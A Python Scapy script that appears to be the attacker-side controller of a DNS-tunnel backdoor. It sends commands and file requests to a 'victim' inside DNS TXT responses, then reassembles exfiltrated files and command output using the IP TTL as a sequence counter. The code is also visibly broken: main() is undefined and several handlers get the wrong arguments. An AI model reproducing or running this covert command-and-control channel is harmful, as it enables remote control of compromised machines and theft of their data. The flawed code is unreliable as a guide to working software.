from audioop import add
from curses import OK
from scapy.all import DNS, DNSQR, DNSRR
from scapy.all import *
from scapy.layers.inet import UDP, IP, Ether
from scapy.all import *
import time
import subprocess
from base64 import b64encode
from enum import IntEnum

 
victim_ip = ""
active = False
seqnum = 64
str_to_print = ""
file_buff = bytes(str_to_print.encode())

def printFileHandler(pkt, input_seq,payload, strfile_buff):
    global seqnum
    if seqnum == input_seq:
        strfile_buff += payload
        seqnum = seqnum + 1
        if seqnum == 255:
            seqnum = 64

    sendDNSRes(pkt, "ok", "1")

    
 
  
def endFileHandler(pkt, input_seq, payload):
    global file_buff
    if input_seq == seqnum:
        filename = input("enter file name: \n")
        file_buff += payload
        seqnum = 64
        with open(filename, "wb") as file:
            file.write(file_buff)
        file_buff = bytes("".encode())
    sendDNSRes(pkt, "ok", "0")


def endPrintHandler(pkt, input_seq,payload):
    global str_to_print , seqnum
    if seqnum == input_seq:
        str_to_print += payload
        seqnum = 64
        print(str_to_print)
        str_to_print = ""

    sendDNSRes(pkt, "ok", "0")
    


def HelloHandler(packet):
    flag_fileOrPrint = input("for file choose 1, for print choose 2:\n")
    if flag_fileOrPrint == "1":
        res = input("enter file path.")
    if flag_fileOrPrint == "2":
        res = input("enter command")
    sendDNSRes(packet ,res, flag_fileOrPrint)
 
def sendDNSRes(packet, payload, flag):
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src,
    )
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
    )
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        rd=0,
        ancount=1,
        an=DNSRR(
            type='TXT',
            rdata=((flag + payload).encode()))
    )

    response_packet = ip / udp / dns
    time.sleep(0.5)
    send(response_packet)

 

def DNSHandler(pkt):
    global str_to_print, file_buff
    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()   
    victimseq = pkt[0]['IP'].ttl
    handle_flag = payload[0]

    match handle_flag:
        case "1":
            printFileHandler(pkt,victimseq, payload[1:], str_to_print)
        case "2":
            printFileHandler(pkt, victimseq, payload[1:], file_buff)
        case "3":
            endPrintHandler(payload[1:])
        case "4":
            endFileHandler(payload[1:])
        case "5":
            HelloHandler(pkt)
 
if __name__ == "__main__":
    main()
